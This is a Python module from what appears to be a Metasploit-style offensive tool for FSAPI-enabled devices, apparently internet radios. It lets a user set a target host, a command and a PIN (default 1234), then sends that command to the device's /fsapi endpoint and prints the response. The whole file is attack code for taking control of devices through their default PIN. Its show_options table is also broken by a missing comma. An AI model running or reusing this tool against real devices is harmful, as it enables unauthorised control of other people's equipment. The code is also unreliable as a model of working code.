from fsradio.base.core import BaseModule, Module, check_ip_back, fetch_url, parse

class ExecModule(BaseModule):

    def __init__(self) -> None:
        super().__init__("/fsapi/command_execution", 4)

        self.COMMAND = 0
        self.RHOST= 1
        self.PIN= 2
        self.PARAM= 3

        self.CHILD_VALUE = ""

        self.set_option(self.PIN, "1234")

    def show_options(self):
        l_option = self.len_of(["Rhost", "command", "option", "pin", "param"])
        l_required = self.len_of(["yes", "no", "Required"])
        l_value = self.len_of([self.get_option(self.RHOST), self.get_option(self.PIN), 
                                self.get_option(self.PARAM), self.get_option(self.COMMAND),
                                "value"])

        self.print_table(l_option, l_required, l_value, 
                        [["OPTION", "REQUIRED", "VALUE"],
                        ["RHOST", "yes", self.get_option(self.RHOST)],
                        ["COMMAND", "yes", self.get_option(self.COMMAND)],
                        ["PIN", "no", self.get_option(self.PIN)]
                        ["PARAM", "no", self.get_option(self.PARAM)]])

    def check(self, c):
        return c != None and c != ""

    def react(self, input: str):
        a = input.split(" ")
        if a[0] == "set":
            self._set_(a)
        elif a[0] == "run" or a[0] == "exploit":
            self.run()
        elif a[0] == "show":
            if a[1] == "options":
                self.show_options()
        elif a[0] == "-h":
            self.show_help()

    def _set_(self, cmds):
        if cmds[1] == "COMMAND":
            self.set_option(self.COMMAND, str(cmds[2]))
            print(f" COMMAND → {self.get_option(self.COMMAND)}\n")
        elif cmds[1] == "RHOST":
            self.set_option(self.RHOST, str(cmds[2]))
            print(f" RHOST → {self.get_option(self.RHOST)}\n")
        elif cmds[1] == "PIN":
            self.set_option(self.PIN, str(cmds[2]))
            print(f" PIN → {self.get_option(self.PIN)}\n")
        elif cmds[1] == "PARAM":
            if len(str(cmds[2]).split("=")) == 2:
                self.set_option(self.PARAM, str(cmds[2]))
                print(f" PARAM → {self.get_option(self.PARAM)}\n")
        else:
            print(f" [!] Unexpected command: {cmds[1]}\n")

    def run(self):
        if not self.check(self.get_option(self.COMMAND)):
            print(f" [!] Cannot run without a command: {self.get_option(self.COMMAND)}")  
            return

        if not self.check(self.get_option(self.PIN)):
            print(f" [!] Cannot run without a pin: {self.get_option(self.PIN)}")
            return

        if not check_ip_back(self.get_option(self.RHOST)):
            print(f" [!] Cannot run without a host: {self.get_option(self.RHOST)}")
            return
    
        URL_t = f"http://{self.get_option(self.RHOST)}/fsapi/{self.get_option(self.COMMAND)}?pin={self.get_option(self.PIN)}"
            
        if self.check(self.get_option(self.PARAM)):
            URL_t += f"&{self.get_option(self.PARAM)}"

        print(f"\n [*] Running with: '{URL_t}'")
        page = fetch_url(URL_t)
        print(" [*] Got a response!\n")

        print(f" [*] Status Code: {page.status_code}")
        data = parse(page.text)
        if data != None:
            for st in data.iter("status"):
                print(f" [*] FS code: {st.text}")
            
            print(" [*] Printing collected data...\n")
            print(" ┌─ Root")
            for value in data.iter('value'):
                for child in value.getchildren():
                    print(f" └─── {child.tag}: {child.text}")
                    self.CHILD_VALUE = child.text
                
            #print("\n[*] Successfully executed!")
        else:
            print(" [!] Unknown error:\n")#
            print(page.text)

    def show_help(self):
        print("\nCommands provided by this module:")
        print("──────────────────────────────────\n")
        print("[command] value\n")
        print("-h\t\tshow the help content")
        print("set\t\tset a specific value. There are different options ")
        print("\t\twhen trying to gather information about your device.")
        print("\t\tuse: COMMAND, RHOST, PIN, PARAM")
        print("show options\t\tshow the specified options")
        print("back\t\tcloses this shell")
        print("run\t\truns the exlpoit\n\n")
